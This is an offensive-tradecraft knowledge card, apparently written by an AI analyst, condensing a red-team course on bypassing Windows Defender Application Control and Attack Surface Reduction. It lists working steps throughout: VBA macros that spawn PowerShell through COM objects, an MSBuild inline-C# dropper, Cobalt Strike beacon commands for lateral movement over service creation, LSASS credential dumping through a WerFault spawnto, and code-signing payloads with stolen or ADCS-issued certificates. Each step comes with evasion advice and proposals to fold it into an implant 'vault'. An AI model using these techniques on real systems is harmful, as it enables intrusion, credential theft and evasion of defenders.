---
id: RTO-wdac-asr-bypass
name: WDAC & ASR Bypass — Red Team Ops Reference
source: Red Team Ops / Zero-Point Security
category: wdac-asr
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-007, T-013, T-016, T-017, T-022, T-023]
tags: [wdac, asr, device-guard, code-integrity, lateral-movement, lsass, com-bypass, lolbas, g2js, code-signing, cobalt-strike]
---

# WDAC & ASR Bypass — Training Reference

## TL;DR
This module covers two Windows hardening stacks — Windows Defender Application Control (WDAC, formerly Device Guard) and Attack Surface Reduction (ASR) — from an offensive operator's perspective. It teaches how to enumerate the deployed policy from GPO / registry / `Get-MpPreference`, then chain a series of policy-weakness bypasses (COM parent-spoofing, GadgetToJScript, MSBuild LOLBIN, WMI event subscriptions, WerFault-as-spawnto, reflection-based loaders, ADCS code-signing abuse) rather than attacking the WDAC/ASR primitives themselves. The vault has no dedicated WDAC/ASR card, so this material substantially extends coverage into policy-bypass tradecraft.

## Key Concepts

1. **WDAC is a security boundary (not AppLocker)** — Microsoft treats WDAC as an officially serviced security boundary, meaning bypasses are usually patched and assigned CVEs. "Bypassing WDAC" in practice means finding weaknesses in the *deployed policy* (wildcards, user-writable allow paths, over-trusted CAs, vulnerable trusted apps) rather than defeating the underlying enforcement. **Vault gap**: the vault does not yet have a dedicated WDAC card — this material is the canonical source.

2. **Policy acquisition chain** — WDAC policies originate as XML, get merged + packaged as `.p7b`, and are distributed via GPO (`GpcFileSysPath` → `Registry.pol` → `ConfigCIPolicyFilePath` key → UNC/SYSVOL `.p7b`), or locally under `C:\Windows\System32\CodeIntegrity`. Matt Graeber's `CIPolicyParser.ps1` (`ConvertTo-CIPolicy`) reverses the binary p7b back to readable XML.

3. **WDAC rule types** — `Hash`, `FileName`, `FilePath`, `Publisher` (and signing cert levels `Leaf` vs `PCA`). Each has a specific bypass pattern: wildcards + writable paths; user-modifiable binaries; stolen/issued code-signing certs; vulnerable trusted apps that load arbitrary content.

4. **Runtime FilePath Rule Protection** — A critical WDAC policy option that auto-rejects FilePath rules for user-writable locations. Disabling it (`<Option>Disabled:Runtime FilePath Rule Protection</Option>`) is a policy smell operators should grep for — every FilePath bypass depends on this being off or on administrator-owned paths.

5. **ASR is LUA-based, enforced by Defender** — ASR rules are GUID-keyed DWORDs (`0=Disable, 1=Block, 2=Audit, 6=Warn`) under `HKLM\Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules`. The training focuses on the Office-targeting subset (child processes, Win32 API calls, code injection, PsExec/WMI, LSASS credential theft).

6. **ASR rules have an implicit blacklist model** — Not every spawned child is blocked; the rule appears to enumerate blocked parent→child relationships. LOLBAS like `MSBuild.exe` slip through because they're not on the Office-child list. This is the operational insight that unlocks the LOLBAS bypass family.

7. **P/Invoke is detected statically, not at call time** — The "Block Win32 API calls from Office macros" rule triggers when VBA source containing `Declare PtrSafe Function ... Lib` is *saved to disk* (Defender static signature), not when the call executes. Wrapping the P/Invoke in a .NET assembly serialized via **GadgetToJScript** bypasses this because the VBA stage contains no P/Invoke declarations.

8. **ASR blocks APIs selectively** — For code injection, `VirtualAllocEx` / `WriteProcessMemory` succeed but `CreateRemoteThread` is blocked. The mitigation is to pivot to APC-based injection (`QueueUserAPC`), which the vault covers as Early Bird APC (T-013).

9. **WerFault privileged LSASS access** — Setting CobaltStrike `spawnto` to `WerFault.exe` allows `PROCESS_VM_READ` on LSASS despite the "Block credential stealing from LSASS" ASR rule. This is a known ASR carve-out for Windows Error Reporting.

10. **ADCS Web Enrollment = code-signing cert factory** — When `certsrv` Web Enrollment is installed and the Code Signing template is reachable, an operator can submit a CSR (`keytool -certreq`) and walk away with a `.p7b` cert chain importable into a Cobalt Strike keystore — turning a single foothold into a WDAC-trusted payload signing pipeline.

## Operational Techniques

### Discovering WDAC Policy via GPO
- **What**: Locate the WDAC `.p7b` policy file by following the GPO → Registry.pol → `ConfigCIPolicyFilePath` chain.
- **When to use**: Initial access / domain-recon phase, before attempting any blocked execution. Required for choosing which bypass class applies.
- **How**:
  1. `powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1`
  2. `powerpick Get-DomainGPO -Name *WDAC* -Properties GpcFileSysPath` → returns UNC path to GPO Machine folder
  3. `download <GpcFileSysPath>\Machine\Registry.pol`
  4. `Parse-PolFile .\Registry.pol` → look for `SOFTWARE\Policies\Microsoft\Windows\DeviceGuard\DeployConfigCIPolicy = 1` and `ConfigCIPolicyFilePath = \\...\SIPolicy.p7b`
  5. `download <ConfigCIPolicyFilePath>` to grab the `.p7b`
  6. `ipmo C:\Tools\CIPolicyParser.ps1; ConvertTo-CIPolicy -BinaryFilePath .\SIPolicy.p7b -XmlFilePath policy.xml`
  7. Alternative local path: `C:\Windows\System32\CodeIntegrity\SIPolicy.p7b` on any enforced host.
- **Vault link**: No dedicated WDAC card in vault — recommend creating T-024 (WDAC bypass suite). Related to T-016 (EDR evasion) at the "policy circumvention" level but distinct scope.
- **Tool/code**: PowerView (`Get-DomainGPO`), `Parse-PolFile` (PowerSploit Parser), `CIPolicyParser.ps1` (Matt Graeber's gist `92e545bf1ee5b68eeb71d254cec2f78e`)
- **OPSEC**: GPO reads are low-noise but `Get-DomainGPO` against a DC will be logged; download of `Registry.pol` over SMB generates 4663 events on the DC.

### Enumerating ASR Rules
- **What**: Identify which of the 16 ASR GUIDs are enforced (vs audit/warn/disabled) and on which OUs.
- **When to use**: Pre-engagement reconnaissance / before spawning from Office, before lateral movement, before LSASS access.
- **How** (three paths, choose by access level):
  1. **GPO (domain-wide)**: `Get-DomainGPO -Name ASR -Properties GpcFileSysPath` → download `Registry.pol` → look for `ExploitGuard_ASR_Rules = 1` and per-GUID values. Map GUIDs via `Get-DomainOU -GPLink <GUID>` then `Get-DomainComputer -SearchBase LDAP://<OU>`.
  2. **Local registry**: `reg query x64 HKLM\Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules`
  3. **PowerShell**: `Get-MpPreference | select -expand AttackSurfaceReductionRules_Ids` and `..._Actions` (Actions: 1=Block, 2=Audit, 6=Warn)
- **Vault link**: No vault coverage — recommend T-024.
- **Tool/code**: PowerView, `reg query`, `Get-MpPreference`
- **OPSEC**: `Get-MpPreference` is the stealthiest (local only, no DC contact). Registry query is silent. GPO pulls via SMB are noisier.

### ASR Bypass — Office Child Process Block (COM Parent Spoofing)
- **What**: Spawn child processes via COM objects whose `LocalServer32` resolves to a parent other than Office (mmc.exe, explorer.exe).
- **When to use**: Macro initial-access path on hosts with `d4f940ab-401b-4efc-aadc-ad5f3c50688a` (Block Office child processes) enabled.
- **How**:
  - **MMC20.Application** (parent = mmc.exe):
    ```vba
    Sub Exec()
        Dim mmc As Object
        Set mmc = CreateObject("MMC20.Application")
        mmc.Document.ActiveView.ExecuteShellCommand "powershell", "", "", "7"
        Set mmc = Nothing
    End Sub
    ```
    Note: Win10 21H1 spawns mmc.exe *as a child of Office* (fails). Win Server 2019 1809 spawns it as a child of svchost.exe (works). Choose target appropriately.
  - **ShellWindows** (parent = explorer.exe, hidden window — most OPSEC-friendly):
    ```vba
    Sub Exec()
        Dim com As Object
        Set com = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
        com.Item.Document.Application.ShellExecute "powershell", "", "", Null, 0
        Set com = Nothing
    End Sub
    ```
- **Vault link**: COM hijack is covered in T-017 (Five-Layer Persistence) for *persistence*, but this is *evasion-via-COM-spawning* — a distinct use case. Consider adding a COM-spawn sub-technique to T-016.
- **Tool/code**: VBA embedded in macro-enabled Office doc; COM CLSIDs `{MMC20.Application}` and `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}` (ShellWindows)
- **OPSEC**: ShellWindows produces no visible PowerShell window. mmc.exe spawns and exits immediately, leaving an orphan process tree.

### ASR Bypass — Office Child Process Block (MSBuild LOLBAS)
- **What**: Use `MSBuild.exe` to compile+execute inline C# from an XML/.csproj file dropped to disk.
- **When to use**: When COM objects are blocked or monitored, or when you need richer execution than `powershell -Command` allows.
- **How**:
  1. Stash the inline C# MSBuild project XML in `ActiveDocument.BuiltInDocumentProperties("Comments")` to avoid dropping a separate payload file.
  2. Macro extracts comment, writes to `%TEMP%\code.xml`, executes:
     ```vba
     command = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe " & temp & "\code.xml"
     wsh.Run command
     ```
  3. C# class extends `Task, ITask` with a `CodeTaskFactory` `UsingTask` block:
     ```xml
     <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
       <Target Name="MSBuild"><ASRSucks /></Target>
       <UsingTask TaskName="ASRSucks" TaskFactory="CodeTaskFactory"
                  AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
         <Task><Code Type="Class" Language="cs"><![CDATA[ ... ]]></Code></Task>
       </UsingTask>
     </Project>
     ```
- **Vault link**: No LOLBAS coverage in vault. T-020 (anti-analysis) mentions Kaguya LOtL inventory but not for *execution* via LOLBAS. Consider T-024 sub-technique.
- **Tool/code**: `MSBuild.exe` (.NET Framework 4 x64 path above), VBA dropper
- **OPSEC**: Drops the XML to `%TEMP%` — must be cleaned up after execution. MSBuild execution is moderately noisy (process start, child csc.exe sometimes).

### ASR Bypass — Block Win32 API Calls (GadgetToJScript)
- **What**: Wrap P/Invoke calls in a .NET assembly, serialize to a VBA gadget via G2JS so the VBA stage contains no `Declare ... Lib` statements.
- **When to use**: When you need to call Win32 APIs (e.g. for injection) from a macro on a host with `92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b` enabled.
- **How**:
  1. Write C# class with P/Invoke in its constructor:
     ```csharp
     public class Program {
         [DllImport("user32.dll", CharSet=CharSet.Unicode)]
         static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, uint uType);
         public Program() { MessageBoxW(IntPtr.Zero, "Hello", "Hello World", 0); }
     }
     ```
  2. Generate: `GadgetToJScript.exe -c TestAssembly\Program.cs -o C:\Users\Administrator\Desktop\vba -w vba -b`
  3. Paste generated `.vba` content into Word and execute.
- **Vault link**: No vault coverage of G2JS. Relevant to T-016 (EDR evasion) as an *in-memory .NET loader pattern*; complement to T-023 (client capabilities) which uses `Assembly.Load` patterns internally.
- **Tool/code**: [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript) (`-w vba` flag, `-b` for bypass mode)
- **OPSEC**: G2JS has a static Defender signature (training notes mention Defender may complain about the content). Inline `out _` doesn't compile in G2JS — must use named `out bytesWritten` parameter.

### ASR Bypass — Block Code Injection (QueueUserAPC)
- **What**: Use `QueueUserAPC`-based injection instead of `CreateRemoteThread` since the latter is blocked by ASR.
- **When to use**: When injecting shellcode from a macro / .NET assembly on a host with the "Block Office applications from injecting code into other processes" rule.
- **How**: Spawn suspended process → `VirtualAllocEx` (works) → `WriteProcessMemory` (works) → `QueueUserAPC` against the suspended thread's APC queue → resume thread. The vault's Early Bird APC implementation (T-013) is the productionised form of this.
- **Vault link**: **T-013 Remaining Methods → Early Bird APC** — directly applicable. The vault's implementation goes further with thread pool and early cascade variants (T-007, T-012).
- **Tool/code**: Custom C# injector compiled via G2JS; P/Invoke signatures for `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `QueueUserAPC`, `ResumeThread`.
- **OPSEC**: Memory region is still visible in the target process (Defender can scan it). Pair with shellcode encryption (T-021) and sleep obfuscation (T-005) for full chain.

### ASR Bypass — Block PsExec/WMI (Custom Service)
- **What**: Bypass PsExec ASR block by manually creating and starting a service via `sc.exe` over `\\<host>\ADMIN$`.
- **When to use**: Lateral movement to a host where you're local admin, with `d1e49aac-8f56-4280-b9fa-993a6d77406c` enabled.
- **How**:
  ```
  beacon> cd \\wkstn-2\admin$
  beacon> upload /root/beacon-svc.exe
  beacon> run sc \\wkstn-2 create RandoService binPath= C:\Windows\beacon-svc.exe
  beacon> run sc \\wkstn-2 start RandoService
  beacon> link wkstn-2
  beacon> rm beacon-svc.exe
  beacon> run sc \\wkstn-2 delete RandoService
  ```
- **Vault link**: T-022 (network suite) and T-023 cover client capabilities; neither has explicit service-based lateral movement. Cobalt Strike's `jump psexec` works because it implements exactly this pattern.
- **Tool/code**: `sc.exe` (create/start/delete), `upload` to ADMIN$, `link` for SMB beacon
- **OPSEC**: 7045 (service install) event on target. Service name should look plausible. Clean up with `sc delete` immediately after link.

### ASR Bypass — Block PsExec/WMI (WMI Event Subscription)
- **What**: Use `ActiveScriptEventConsumer` (VBScript engine) via a temporary WMI event subscription so payload runs under `scrcons.exe` (not `WmiPrvSE.exe`).
- **When to use**: When the WMI process call create path (`wmic /node` / `remote-exec wmi`) is blocked by ASR.
- **How**:
  1. Generate VBS payload: `GadgetToJScript.exe -a <Assembly.dll> -w vbs -o C:\Users\Administrator\Desktop\wmi -b`
  2. Patch SharpWMI: hardcode the gadget into a `private static string HardcodedGadget` field, force `GetVBSPayload` to return it (because G2JS output is too large for `scriptb64=` argument).
  3. Recompile SharpWMI.
  4. `execute-assembly /root/tools/SharpWMI2.exe action=executevbs computername=wkstn-2 script=blah`
  5. SharpWMI creates event filter, ActiveScriptEventConsumer, FilterToConsumerBinding; waits 10s; tears down.
- **Vault link**: T-017 (persistence suite) covers TLS callbacks, schtask, COM hijack — **WMI event subscription persistence is not in the vault**. This is a persistence gap; consider adding.
- **Tool/code**: [SharpWMI](https://github.com/GhostPack/SharpWMI) (patched), GadgetToJScript (`-w vbs`)
- **OPSEC**: `scrcons.exe` exits shortly after payload fires — **must migrate out immediately** (`inject`, `shinject`, `shspawn`). Self-injecting payloads (e.g. `var target = Process.GetCurrentProcess();`) work well.

### ASR Bypass — Block LSASS Credential Theft (WerFault spawnto)
- **What**: Set Cobalt Strike `spawnto` to `WerFault.exe` so the post-ex spawn process can obtain `PROCESS_VM_READ` on LSASS for `MiniDumpWriteDump`.
- **When to use**: Credential harvesting on hosts with `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2` (Block LSASS credential theft) enabled.
- **How**:
  ```
  beacon> spawnto x64 C:\Windows\System32\WerFault.exe
  beacon> execute-assembly C:\Tools\MiniDumpWriteDump\bin\Debug\MiniDumpWriteDump.exe
  ```
  Avoid `rundll32` spawnto — Defender kills the beacon on sight.
- **Vault link**: T-023 (client capabilities) includes `experimental/harvest/lsass_dump.rs` using `MiniDumpWriteDump`. The vault implementation should adopt the WerFault spawnto trick as default for ASR-protected hosts.
- **Tool/code**: `MiniDumpWriteDump.exe` (custom), Cobalt Strike `spawnto` command
- **OPSEC**: WerFault process spawn is plausible (crash handler), low-suspicion. The MiniDumpWriteDump call on LSASS still produces a memory artifact; if Defender ATP is present, alert may still fire.

### WDAC Bypass — Wildcard FilePath Rules
- **What**: Identify `<Allow ... FilePath="%OSDRIVE%\Temp\*" MinimumFileVersion="0.0.0.0" />` style rules and drop payload in the wildcarded path.
- **When to use**: Post-policy-recon, when FilePath wildcards are present and `Runtime FilePath Rule Protection` is either disabled or the path is admin-writable.
- **How**:
  1. Convert `.p7b` → XML via `ConvertTo-CIPolicy`.
  2. Grep for `<FileRules>` containing `*` in `FilePath=`.
  3. Check policy options for `<Option>Disabled:Runtime FilePath Rule Protection</Option>`.
  4. Check ACL on target directory: `Get-Acl -Path 'C:\Temp\' | select -expand Access`.
  5. If user-writable AND protection disabled → drop payload, execute.
- **Vault link**: No vault coverage. Recommend T-024 (WDAC bypass suite).
- **Tool/code**: `CIPolicyParser.ps1`, `Get-Acl`
- **OPSEC**: Payload sits on disk in plaintext path — pair with encryption and post-execution cleanup.

### WDAC Bypass — User-Modifiable Binaries
- **What**: Find FilePath-allowed unsigned binaries whose DACL permits write by authenticated users, replace with malicious content.
- **When to use**: When policy uses explicit FilePath rules (no wildcards) but the allowed files are themselves writable.
- **How**:
  1. Parse policy XML → enumerate `<Allow ... FilePath="..." />` entries.
  2. For each allowed binary: `Get-AuthenticodeSignature -FilePath '<path>\*' | ft` (confirm NotSigned) and `Get-Acl -Path '<path>' | select -expand Access`.
  3. Look for `NT AUTHORITY\Authenticated Users : Allow Modify` or similar.
  4. Stop service / wait for unused state → replace binary → trigger execution.
- **Vault link**: No vault coverage. Conceptual overlap with T-008 (Threadless injection's export hijack) which targets *loadable* DLLs.
- **Tool/code**: `Get-AuthenticodeSignature`, `Get-Acl`
- **OPSEC**: File replacement may be caught by file integrity monitoring; consider ADS-based substitution or in-place patching.

### WDAC Bypass — Trusted Signers (ADCS Code-Signing Abuse)
- **What**: Obtain a code-signing certificate trusted by the WDAC policy (Leaf or PCA level) and use it to sign payloads.
- **When to use**: When policy trusts an internal CA and ADCS Web Enrollment is reachable.
- **How**:
  1. **Stolen PFX path**: `signtool.exe sign /f SignedAppCert.pfx /p password /fd SHA256 EvilApp.exe`
  2. **ADCS Web Enrollment path** (preferred when CSR is feasible):
     - Generate keystore: `keytool -genkey -alias server -keyalg RSA -keysize 2048 -keystore keystore.jks`
     - Generate CSR: `keytool -certreq -alias server -file req.csr -keystore keystore.jks`
     - Submit CSR at `http://ca.<domain>/certsrv` → Request a certificate → advanced → paste CSR → select "Code Signing" template → Download certificate chain (`certnew.p7b`)
     - Import chain: `keytool -import -trustcacerts -alias server -file certnew.p7b -keystore keystore.jks`
     - Drop `keystore.jks` into cobaltstrike directory, add to Malleable C2 profile:
       ```
       code-signer {
           set keystore "keystore.jks";
           set password "password";
           set alias "server";
       }
       ```
     - Restart team server; payloads now generate with **sign executable file** checkbox.
- **Vault link**: T-022 (network suite) covers malleable C2 — the code-signer block is a standard CS profile element but not specifically documented in the vault. T-023 / T-021 cover payload generation pipeline. **ADCS abuse is not in the vault** — significant gap for ESC1–ESC8 style attacks.
- **Tool/code**: `keytool` (JDK), `signtool.exe` (Windows SDK), ADCS Web Enrollment (`certsrv`), Cobalt Strike Malleable C2 profile
- **OPSEC**: ADCS CSR submission is logged (Certification Authority audit events 4886/4887). Certs have validity windows — get fresh cert per engagement, rotate. Code-signed binaries still appear in telemetry as new signed executables.

### WDAC Bypass — Vulnerable Trusted Applications (.NET Reflection)
- **What**: Abuse a trusted WDAC-allowed application that uses `Assembly.Load(byte[])` on attacker-controlled input to execute arbitrary .NET assemblies inside the trusted process.
- **When to use**: When policy trusts an app with reflection-based loading of user-supplied assemblies.
- **How**:
  1. Identify the vulnerable trusted binary (e.g. `VulnerableApp.exe` takes a path arg).
  2. Place unsigned payload (e.g. `Seatbelt.exe`) in user-writable location.
  3. Execute: `& 'C:\Program Files\LegitApp\VulnerableApp.exe' .\Desktop\Seatbelt.exe`
  4. The payload runs inside the trusted process's AppDomain with all the trust rights.
- **Vault link**: T-013 mentions reflective PE loader but not in the context of WDAC bypass. T-023's `Assembly.Load` patterns are similar. No specific WDAC-vulnerable-app card in the vault.
- **Tool/code**: Any tool that calls `Assembly.Load(byte[])` on attacker-supplied input.
- **OPSEC**: The loaded assembly inherits the trusted process's identity — high value but target-specific. Should be enumerated during recon (`Seatbelt` of running processes + their command lines + WDAC XML).

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `Get-DomainGPO -Name *WDAC* / -Name ASR -Properties GpcFileSysPath` | Find WDAC/ASR policy GPO UNC path | DC contact logged |
| `Parse-PolFile .\Registry.pol` | Decode GPO Registry.pol to readable key/value | Local-only, silent |
| `CIPolicyParser.ps1` (Matt Graeber gist `92e545bf1ee5b68eeb71d254cec2f78e`) → `ConvertTo-CIPolicy -BinaryFilePath .\SIPolicy.p7b -XmlFilePath policy.xml` | Reverse WDAC `.p7b` binary to XML | Local, silent |
| `Get-DomainOU -GPLink <GUID>` | Map GPO → OUs → target hosts | DC LDAP query |
| `Get-DomainComputer -SearchBase LDAP://<OU>` | List hosts in an OU | DC LDAP query |
| `reg query x64 HKLM\...\ASR\Rules` | Local ASR GUID enumeration | Silent |
| `Get-MpPreference` | Local ASR / Defender config | Silent, preferred |
| `Get-AuthenticodeSignature -FilePath '<path>\*'` | Check signing status of binaries | Silent |
| `Get-Acl -Path <path>` | Check DACL for user-writable files | Silent |
| `MMC20.Application` COM CLSID | Spawn child as mmc.exe | Win10 fails, Server 2019 works |
| `ShellWindows` COM CLSID `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}` | Spawn child as explorer.exe (hidden window) | Most OPSEC-safe of COM bypasses |
| `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe <xml>` | Inline C# execution via LOLBAS | Drops XML to disk; clean up after |
| `GadgetToJScript.exe -c <cs> -o <out> -w vba -b` | Wrap .NET in VBA gadget (bypass P/Invoke block) | Has static Defender signature on output |
| `GadgetToJScript.exe -a <dll> -w vbs -o <out> -b` | Wrap .NET in VBS gadget (for WMI consumer) | SharpWMI scriptb64= can't hold large output; hardcode in source |
| [SharpWMI](https://github.com/GhostPack/SharpWMI) `action=executevbs computername=<> script=<>` | WMI event subscription payload execution | scrcons.exe exits fast → migrate immediately |
| `MiniDumpWriteDump` (custom exe) | LSASS memory dump | Spawnto to WerFault for ASR bypass; never rundll32 |
| `sc \\<host> create / start / delete <svc>` | Service-based lateral movement | 7045 event on target |
| `keytool -genkey / -certreq / -import` | Java keystore + CSR for ADCS | Local on teamserver, silent |
| `signtool.exe sign /f <pfx> /p <pw> /fd SHA256 <exe>` | Sign binary with stolen cert | Silent; signature visible in events |
| ADCS Web Enrollment `http://ca.<domain>/certsrv` | Obtain code-signing cert via CSR | 4886/4887 audit events on CA |
| Cobalt Strike `code-signer { ... }` profile block | Auto-sign generated payloads | Teamserver restart required |
| Cobalt Strike `spawnto x64 <path>` | Set post-ex spawn process | WerFault for LSASS dump; notepad as baseline |

## Gaps & Extensions

**Vault coverage that the training does not provide**:
- The vault's full indirect syscall stack (T-001 RecycledGate, T-002 Hell's/Halo's/Tartarus Gate, T-003 VEH Gate, T-006 Phantom Stubs) is well beyond what this training covers — the training is pre-syscall tradecraft (it predates the SysWhispers era in places).
- T-005 (Ekko ROP Sleep), T-007 (Pool Party), T-008 (Threadless), T-009 (Process Ghosting), T-010 (Herpaderping), T-011 (Dirty Vanity), T-012 (Early Cascade) are all post-2022 techniques not in this training's scope. Where the training stops at "QueueUserAPC works", the vault has 15 injection methods with EDR-evasion baked in.
- T-016 (EDR evasion suite) covers AMSI/ETW patching, stack spoofing, NTDLL unhook, arg spoofing, handle blocking — none of which the training addresses. The training assumes Defender's static analysis is the only detection vector.
- T-017 (Five-Layer Persistence) doesn't include WMI event subscriptions — the training's SharpWMI approach should be ported to the vault as a sixth layer.
- T-020 (Anti-Analysis Suite), T-021 (Crypto & Obfuscation), T-022 (Networking Suite), T-023 (Client Capabilities) are entirely absent from this training module.

**Training coverage that the vault lacks**:
- **No dedicated WDAC card exists in the vault.** Recommend T-024 covering: policy recon (GPO / registry / local `C:\Windows\System32\CodeIntegrity`), `CIPolicyParser.ps1` reversal, FilePath wildcard exploitation, user-modifiable binary substitution, Runtime FilePath Rule Protection semantics, ADCS code-signing abuse chain, vulnerable trusted-app reflection bypass.
- **No dedicated ASR card exists in the vault.** Recommend T-025 covering: the 16 ASR GUIDs, their values (0/1/2/6), enumeration via `Get-MpPreference` / GPO / registry, and per-rule bypass primitives (COM parent spoofing, MSBuild LOLBAS, GadgetToJScript, QueueUserAPC, custom service for PsExec, WMI event subscription for WMI, WerFault for LSASS).
- **No ADCS abuse coverage in the vault.** ESC1–ESC8 attacks and the legitimate-but-abusable Web Enrollment CSR path for code-signing certs are a major operational gap.
- **WMI event subscription persistence** is not in the vault's persistence suite (T-017). Should be added as Layer 6.
- **LOLBAS execution tradecraft** (MSBuild, regsvr32, etc.) is not catalogued for offensive use in the vault.
- **GadgetToJScript** as a VBA / VBS / JScript payload generator is not referenced anywhere in the vault. This is a powerful primitive for Office initial-access chains.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| QueueUserAPC injection (ASR code-injection bypass) | T-013 Remaining Methods → Early Bird APC | Same primitive; vault's Early Bird is the productionised version |
| Early Cascade pre-LdrInitializeThunk APC | T-012 Early Cascade | Vault goes deeper (pre-LdrInitializeThunk); training stays at simple APC |
| COM-based spawning (ShellWindows / MMC20) | T-017 Five-Layer Persistence → COM hijack | Vault uses COM for persistence; training uses COM for *spawn evasion* — distinct use cases |
| MSBuild LOLBAS inline C# | (none) | Vault gap — no LOLBAS card |
| GadgetToJScript (.NET serialized gadget in VBA/VBS) | (none) | Vault gap — should be added to T-023 client capabilities |
| Service-based lateral movement (sc create/start) | T-022 Network Suite (SMB transport) | Vault covers SMB transport but not the service-create lateral primitive |
| WMI event subscription via SharpWMI | (none) | Vault gap — should be added to T-017 as persistence Layer 6 |
| LSASS dump via MiniDumpWriteDump | T-023 Client Capabilities → `experimental/harvest/lsass_dump.rs` | Same API; vault's version should adopt WerFault spawnto default |
| WerFault-as-spawnto for ASR LSASS bypass | T-016 EDR Evasion Suite | Not currently in vault's evasion suite — should be added as ASR-specific sub-technique |
| Code-signed payload generation (CS `code-signer` block) | T-022 Network Suite → malleable C2 | Vault covers malleable C2 but not the code-signer profile block |
| ADCS Web Enrollment CSR submission | (none) | Vault gap — no ADCS abuse coverage |
| `Assembly.Load(byte[])` reflection loader | T-013 Remaining Methods → PE Loader | Vault's reflective loader doesn't target WDAC bypass specifically |
| Wildcard FilePath + Runtime Rule Protection | (none) | Vault gap — recommend T-024 |
| User-modifiable binary substitution | T-008 Threadless Injection (export hijack) | Conceptually similar (target loadable file); vault targets DLLs, not exes |
| NTDLL unhook / AMSI patch / stack spoofing | T-016 EDR Evasion Suite | Vault goes far beyond training; training assumes static Defender analysis only |
| Indirect syscall dispatch | T-001 RecycledGate, T-002 Hells/Halo/Tartarus, T-003 VEH Gate, T-006 Phantom Stubs | Vault's syscall stack is the modern equivalent of what training only gestures at |
| Sleep obfuscation | T-005 Ekko ROP Sleep | Vault's 6-frame ROP encryption is the modern form; training has no equivalent |
| AMSI/ETW patching | T-016 EDR Evasion Suite | Vault covers AMSI via HW breakpoint bypass (`amsi_hbp.rs`) and PAGE_GUARD (`amsi_page_guard.rs`); training has none |